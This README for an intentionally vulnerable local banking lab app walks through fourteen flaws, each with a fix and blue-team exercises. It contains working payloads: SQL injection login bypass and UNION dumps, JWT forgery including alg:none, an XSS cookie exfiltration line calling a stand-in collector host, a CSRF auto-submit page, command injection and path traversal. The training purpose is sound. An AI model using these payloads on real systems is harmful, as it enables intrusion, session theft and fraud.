# VulnBank — Intentionally Vulnerable Banking App (Lab Use Only)

⚠️ **WARNING:** This application is deliberately insecure. It is built **only** for
ethical hacking practice and security training in an isolated/local environment.
**Never deploy it to the public internet, never reuse real credentials, and never
point it at real financial data.**

---

## 1. Setup

```powershell
cd vuln-bank
npm install
npm start
```

Open **http://localhost:3000**

### Demo accounts

| Username | Password              | Account ID | Role  |
|----------|------------------------|:---:|-------|
| alice    | alicepass123           | 1   | user  |
| bob      | bobpass123              | 2   | user  |
| admin    | admin                   | 3   | admin |

---

## 2. Vulnerabilities — what they are & exactly how to exploit them

Each section: **what/where** → **step-by-step bypass** → **why it works** → **fix**.

### 2.1 SQL Injection — Login bypass (Authentication Bypass)
**Where:** `POST /api/login` (`server.js`) — the login form on `index.html`.

**Steps:**
1. Go to the login page.
2. Username: `' OR '1'='1' --`
3. Password: anything, e.g. `x`
4. Click **Log In** → you're logged in as the **first user in the table** (alice), without knowing her password.
5. To log in specifically as admin: Username: `admin' -- ` and Password: `anything`.

**Why:** The query is built with string concatenation:
```js
`SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`
```
`--` comments out the password check, and `' OR '1'='1'` makes the WHERE clause always true.

**Fix:** Use parameterized queries: `db.all('SELECT * FROM users WHERE username = ? AND password = ?', [username, password])`.

---

### 2.2 SQL Injection — UNION-based data extraction
**Where:** `GET /api/transactions?search=` — the "Search notes" box on the Dashboard.

**Steps:**
1. Log in as any user (e.g. alice).
2. In the transaction search box, enter:
   ```
   %' UNION SELECT id, username, password, full_name, balance, is_admin FROM users -- 
   ```
3. Click **Search** → the results table now shows every user's `id, username, password, full_name, balance, is_admin` disguised as transaction columns (plaintext passwords included).

**Why:** `search` is concatenated into `... AND note LIKE '%${search}%'` with no escaping, and the `users` table has a compatible column count for a UNION.

**Fix:** Parameterized queries + strict input validation; never allow user input to influence SQL structure.

---

### 2.3 Broken Access Control / IDOR (Insecure Direct Object Reference)
**Where:** `GET /api/account/:id` — the "View Account" box on `account.html`.

**Steps:**
1. Log in as alice (account id 1).
2. Go to **Account / Comments** page.
3. Change "Account ID" field to `3` (admin) or `2` (bob) and click **Load**.
4. You now see the admin's full name and full balance — no ownership check was performed.

**Why:** The endpoint trusts the URL parameter directly and never checks `req.user.id === id`.

**Fix:** Verify the authenticated user owns (or is authorized to view) the requested resource before returning data.

---

### 2.4 Missing Function-Level Access Control (Privilege Escalation)
**Where:** `GET /api/admin/users` — the Admin page.

**Steps (two ways to become "admin"):**

**A. Just log in as the seeded admin account** (`admin` / `admin`) and visit `admin.html` → click **Load Users** → dumps every username/plaintext-password/balance.

**B. Forge your own admin JWT** (see §2.5) as a normal user, e.g. alice, and still access `/api/admin/users`.

**Why:** The server only checks `user.is_admin` from the JWT payload — see §2.5 for how trivially that can be forged.

**Fix:** Re-verify privileges against the database on every privileged request; never trust a bare token claim for authorization decisions without strong signature verification.

---

### 2.5 Insecure JWT — Weak secret & unsafe fallback decode (Auth Bypass / Privilege Escalation)
**Where:** `server.js` — `JWT_SECRET = 'bank123'` and `getUserFromToken()`.

**Steps — forge an admin token:**
1. Log in normally as alice to get a valid session/cookie, then open browser DevTools → Application → Cookies, and note the `token` cookie value (or just craft one from scratch, see below).
2. Using [jwt.io](https://jwt.io) or a small script, create a token:
   - Header: `{"alg":"HS256","typ":"JWT"}`
   - Payload: `{"id":1,"username":"alice","is_admin":true}`
   - Secret: `bank123`
3. Sign it (HS256, secret `bank123`) and paste the resulting JWT as the value of the `token` cookie in your browser (DevTools → Application → Cookies → edit value).
4. Reload `admin.html` and click **Load Users** → access granted, even though alice is not really an admin.

**Alternative — `alg:none` bypass (no secret needed at all):**
1. Take a valid token, base64url-decode the header and payload.
2. Change header to `{"alg":"none","typ":"JWT"}`, keep payload `{"id":1,"username":"alice","is_admin":true}`.
3. Base64url-encode both parts, join with dots, and leave the signature part **empty**: `header.payload.` (trailing dot, no signature).
4. Set this as the `token` cookie. Because `getUserFromToken()` falls back to `jwt.decode()` (which never checks a signature) whenever `jwt.verify()` throws, this forged token is accepted.

**Quick script example (Node, run locally to generate a forged token):**
```js
const jwt = require('jsonwebtoken');
console.log(jwt.sign({ id: 1, username: 'alice', is_admin: true }, 'bank123', { algorithm: 'HS256' }));
```

**Why:** The secret is hardcoded and guessable, and the server never restricts `algorithms: ['HS256']` on verify, plus it insecurely falls back to unverified `jwt.decode()`.

**Fix:** Use a long random secret from an environment variable/secret manager, call `jwt.verify(token, secret, { algorithms: ['HS256'] })` only, and never fall back to `jwt.decode()` on verification failure — reject the request instead.

---

### 2.6 Stored Cross-Site Scripting (XSS)
**Where:** Comments feature on `account.html` (`POST /api/comments`, rendered via `innerHTML` in `public/js/account.js`).

**Steps:**
1. Log in as any user, go to **Account / Comments**.
2. In "Add a comment", paste:
   ```html
   <img src=x onerror="alert(document.cookie)">
   ```
3. Click **Post Comment** → the alert fires immediately for you, and will fire for **any other user/admin** who later views that account's comments — because the cookie is not `httpOnly`, this payload can exfiltrate session tokens, e.g.:
   ```html
   <img src=x onerror="fetch('https://your-collector.example/steal?c='+document.cookie)">
   ```

**Why:** The comment body is stored raw and injected with `div.innerHTML = ...` on the frontend with no sanitization/escaping.

**Fix:** Escape HTML on output (or use `textContent`), sanitize input server-side, and set cookies `httpOnly: true`.

---

### 2.7 Reflected Cross-Site Scripting (XSS)
**Where:** `GET /api/search-help?q=` (linked from the Tools page "Help Search").

**Steps:**
1. Go to **Tools** page → "Help Search (reflected)".
2. Enter: `<script>alert(document.domain)</script>` and click **Open results in new tab**, OR directly browse to:
   ```
   http://localhost:3000/api/search-help?q=<script>alert(document.domain)</script>
   ```
3. The script executes immediately in that page's context (a real attack would send this URL to a victim, e.g. via a phishing link).

**Why:** `q` is concatenated straight into the HTML response with no encoding.

**Fix:** HTML-encode all reflected user input before writing it into a response.

---

### 2.8 Cross-Site Request Forgery (CSRF)
**Where:** `POST /api/transfer` (Transfer page) — no CSRF token, cookie-only auth, cookie not `SameSite`-restricted.

**Steps (simulate an attacker's malicious page):**
1. Log in to VulnBank as alice in your browser (keep the tab/session open).
2. Save the following as `evil.html` **outside** the app (e.g. on your Desktop) and open it in the **same browser**:
   ```html
   <html><body onload="document.forms[0].submit()">
     <form action="http://localhost:3000/api/transfer" method="POST" enctype="text/plain">
       <input name='{"to_account":3,"amount":500,"note":"pwned' value='"}' >
     </form>
   </body></html>
   ```
   (Or, more reliably for a JSON API, host a tiny script using `fetch` with `credentials: 'include'` from another origin.)
3. Opening `evil.html` silently sends money from alice's account to account 3, without alice ever visiting the Transfer page herself.

**Why:** The transfer endpoint trusts the session cookie alone; there is no CSRF token, and the cookie has no `SameSite` protection configured.

**Fix:** Implement anti-CSRF tokens (e.g. `csurf`/double-submit cookie), set cookies with `SameSite=Strict` or `Lax`, and verify the `Origin`/`Referer` header for state-changing requests.

---

### 2.9 OS Command Injection
**Where:** `POST /api/ping` (Tools page → "Network Diagnostics").

**Steps:**
1. Go to **Tools** page.
2. In "Host to ping", enter:
   ```
   127.0.0.1 && whoami
   ```
   (On Windows PowerShell-based shells, `&&`/`&` both tend to work since `exec` uses `cmd.exe`.)
3. Click **Ping** → the output box shows the ping output **followed by the output of `whoami`**, proving arbitrary command execution.
4. Try further: `127.0.0.1 && dir` or `127.0.0.1 && type ..\server.js` to prove file read via command execution.

**Why:** `exec('ping -n 1 ' + host)` passes unsanitized user input directly to a shell.

**Fix:** Never build shell commands from user input. Use `child_process.execFile('ping', ['-n', '1', host])` (no shell) plus strict allow-list validation of `host` (e.g. IPv4/hostname regex).

---

### 2.10 Path Traversal (Arbitrary File Read)
**Where:** `GET /api/statement?file=` (Tools page → "Download Statement").

**Steps:**
1. Go to **Tools** page → "Download Statement".
2. Enter file name: `../server.js` and click **View** → the full backend source code is returned.
3. Try reading OS files, e.g. on Windows: `../../../../../../windows/win.ini`, and click **View** again.
4. You can also hit the endpoint directly: `http://localhost:3000/api/statement?file=../server.js`

**Why:** `path.join(__dirname, 'statements', file)` does not strip `..` segments, so the path escapes the intended `statements/` folder.

**Fix:** Resolve the final path and verify (e.g. with `path.resolve` + a prefix check) that it stays inside the intended directory; alternatively use an allow-list of known filenames/IDs instead of raw filenames.

---

### 2.11 Plaintext Password Storage & Sensitive Data Exposure
**Where:** [db.js](C:/Users/rayan/Desktop/vulnorable/vuln-bank/db.js) (seed data) and `GET /api/admin/users`.

**Steps:**
1. Gain admin access (§2.3 or §2.4/§2.5).
2. Visit **Admin** page → **Load Users** → every user's password is shown **in plaintext** in the table.

**Why:** Passwords are stored and compared as plaintext strings; there is no hashing (e.g. bcrypt/argon2) anywhere in the app.

**Fix:** Hash passwords with bcrypt/argon2 + per-user salt at signup; never return password fields from any API.

---

### 2.12 Verbose Error Messages (Information Disclosure)
**Where:** `sendError()` helper in `server.js`, triggered by malformed SQL (e.g. a broken injection attempt).

**Steps:**
1. On the Dashboard search box, enter something that breaks the SQL syntax, e.g. a lone single quote: `'`
2. Click **Search** → the response is a full Node.js stack trace, revealing internal file paths, the SQL query structure, and library versions.

**Why:** Unhandled DB errors are sent straight to the client as raw stack traces instead of a generic message.

**Fix:** Log errors server-side only; return a generic `500 Internal Server Error` message to clients.

---

### 2.13 Insecure Cookie Flags
**Where:** All cookies set in `server.js` (`httpOnly: false` on both the JWT cookie and the session cookie).

**Steps:**
1. Log in, then open browser DevTools Console and run:
   ```js
   document.cookie
   ```
2. You can read the `token` and session cookies directly from JavaScript — this is exactly what enables the cookie-stealing payload in §2.6 to work.

**Why:** Cookies are explicitly configured with `httpOnly: false`.

**Fix:** Set `httpOnly: true`, `secure: true` (with HTTPS), and `sameSite: 'Strict'|'Lax'` on all session/auth cookies.

---

### 2.14 Weak Session Secret
**Where:** `express-session` configuration in `server.js` — `secret: 'keyboard cat'`.

**Impact:** This is a well-known example value; if session cookies were ever signed in a way an attacker could forge (e.g. using `express-session`'s signing), a guessable/default secret makes forging or tampering trivial.

**Fix:** Use a long, random secret loaded from an environment variable, rotated periodically, and never committed to source control.

---

## 3. Suggested lab exercise flow (chained attack)

A realistic walkthrough combining several bugs:

1. **Recon:** Browse the app, note the login form and hint boxes.
2. **SQLi login bypass** (§2.1) to get into alice's account without her password.
3. **IDOR** (§2.3) to peek at the admin's account balance and confirm account id 3 = admin.
4. **UNION-based SQLi** (§2.2) to dump the `users` table including admin's plaintext password directly, OR
5. **Forge a JWT** (§2.5) to escalate straight to admin privileges without ever knowing a password.
6. **Admin panel dump** (§2.4) to confirm you now see every user's data.
7. **Stored XSS** (§2.6) to plant a cookie-stealing payload where an admin is likely to view it (e.g. comment on your own account, then get an admin to view it via IDOR-guessing account IDs).
8. **CSRF** (§2.8) proof-of-concept to move funds without the victim's explicit action.
9. **Command injection** (§2.9) and **path traversal** (§2.10) to demonstrate server/host compromise beyond the web app logic itself.

---

## 4. Blue-team follow-up: fixing exercises

For each vulnerability above, students should implement and verify a fix, for example:

- Parameterized queries everywhere (never string-concatenate SQL).
- Output encoding/escaping for all user-controlled content rendered as HTML.
- CSRF tokens (or double-submit cookie pattern) on all state-changing requests.
- `httpOnly` + `secure` + `SameSite` cookies.
- JWTs verified with a strong secret and a restricted `algorithms` allow-list; never fall back to unverified decoding.
- Passwords hashed with bcrypt/argon2; never return password fields from any API.
- File paths validated/allow-listed and resolved safely to prevent traversal.
- `exec`/shell calls replaced with `execFile` + strict input validation, or removed entirely.
- Generic error responses to clients; detailed errors logged server-side only.
- Proper authorization checks (ownership + role) on every resource-accessing endpoint, re-verified server-side rather than trusted from client tokens alone.

After each fix, re-run the corresponding exploit steps above to confirm the vulnerability is closed.
